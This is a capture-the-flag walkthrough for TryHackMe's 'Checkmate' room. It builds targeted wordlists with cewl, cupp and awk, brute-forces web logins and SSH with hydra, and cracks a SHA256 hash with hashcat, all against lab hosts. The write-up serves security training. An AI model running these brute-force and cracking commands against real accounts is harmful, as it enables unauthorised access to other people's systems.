# Checkmate Walkthrough
<br/>

## Intro
Welcome to the Checkmate challenge, here is the link to the [room](https://tryhackme.com/room/checkmate) on TryHackMe.
This is a challenge divided in 5 sub-parts, revolving around web-enumeration and login brute-forcing.

In each step we will have to find a password to move next.

Whenever you feel ready click on "Start Machine" and connect using OpenVPN or via the AttackBox.
Let's begin!


<br/>
<br/>

## The Challenge
Lets start by visiting the main app page `http://MACHINE_IP:5000`

Looking at the page source code we can find:
```html
<p class="text-muted">Marco has revealed his password pattern on social.thm:5003, using predictable rules based on keywords and formatting. Use this information to generate a targeted wordlist and brute-force the SSH service with username marco.</p>
```

Let's add this to the hosts file:
```bash
echo "10.82.174.79  social.thm" | sudo tee -a /etc/hosts
```

We can now navigate to `http://social.thm:5003/` here we find an hint:
```
Hint: Use the details from jobs.thm to generate Marco’s password.
```

Let's add this other domain:
```bash
echo "10.82.174.79  jobs.thm" | sudo tee -a /etc/hosts
```

Let's also find the port we need to connect to:
```bash
 rustscan -a  jobs.thm  --ulimit 5000 -- -A -sC -sV -b 1000
```
We get:
```
Open 10.82.174.79:22
Open 10.82.174.79:5003
Open 10.82.174.79:5002
Open 10.82.174.79:5001
Open 10.82.174.79:5000
```

We have already gone to 5000 and 5003, 22 is for SSH, time for 5001.

And it works, go to `http://jobs.thm:5001/` here we see a login for firewall OS, we are told that the user left default credentials, the name "admin" is already there in grey, as for the password we can brute force the login with common credentials or try the most common ones:
We end up with REDACTED being the right one, we can now log in.

Here we find the message:
```
“Secure internal employee portal next.”
```

Which is at `http://jobs.thm:5002/login` here we have the user name but miss the password, with no other clue we need to build a custom wordlist to brute-force this login:
```bash
cewl -d 2 -m 5 --lowercase -w words.txt http://jobs.thm:5002/
```

Now we can send a test password and inspect the request to understand the parameters names and error message, when done we can leverage either burp's intruder, hydra or your fav tool to brute force the login form:
```bash
hydra -l marco -P words.txt jobs.thm -s 5002 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

Here we get `[5002][http-post-form] host: jobs.thm   login: marco   password: excellence` -> REDACTED.


Here we get a bunch of personal info about Marco, since we still need to log into the social platform we can use those details to create another wordlist with `cupp`.
```
cupp -i
```
- add "IT Operations" as an extra word and put `Y` on all the last options.

This creates `marco.txt`:
```bash
hydra -l marco -P marco.txt jobs.thm -s 5003 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

Wait a couple of minutes and we get `[5003][http-post-form] host: jobs.thm   login: marco   password: Bianchi2495` -> REDACTED.
Let's now log in there.

We find a post with the following instructions for the password:
```
My tip for strong passsord: I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark.
```

The level 4 instructions also says:
```
On social.thm:5003, Marco recently uploaded a new profile picture. For privacy and storage consistency, the platform automatically renames uploaded files to the SHA256 hash of the original filename and saves them in the format (SHA256).png. Your task is to identify the original filename of Marco’s uploaded profile picture. Submit only the filename to proceed.
```

If we click on the profile pick we can get the SHA256: `d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b`:
```bash
echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > hash.txt
```

Now we can crack the hash with *hashcat*:
```bash
hashcat -m 1400 -a 0 hash.txt --wordlist rockyou.txt
```
--> REDACTED

<br>

Finally we need to generate a wordlist with the patterns he shared for his "secure password" and attack SSH login with that:
Basically we need to add mutations of the words.txt list

It can be done quickly with `awk`:
```bash
awk '{
    w=toupper(substr($0,1,1)) substr($0,2)
    print w
    for(i=2020;i<=2029;i++) print w i "!"
}' words.txt > final.txt
```

If want to also include numbers from 0-9 instead of the year:
```bash
awk '{
    w=toupper(substr($0,1,1)) substr($0,2)
    print w
    for(i=2020;i<=2029;i++) print w i "!"
    for(i=0;i<=9;i++) print w i "!"
}' words.txt > final2.txt
```

Now we use *hydra* again on SSH:
```bash
hydra -l marco -P final.txt ssh://jobs.thm
```

In a couple of seconds we get the password: REDACTED

<br/>
<br/>


Congratulations, you have successfully enuerated the web app, found the relevant data, cracked the paswword hash to finally login via SSH.

Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
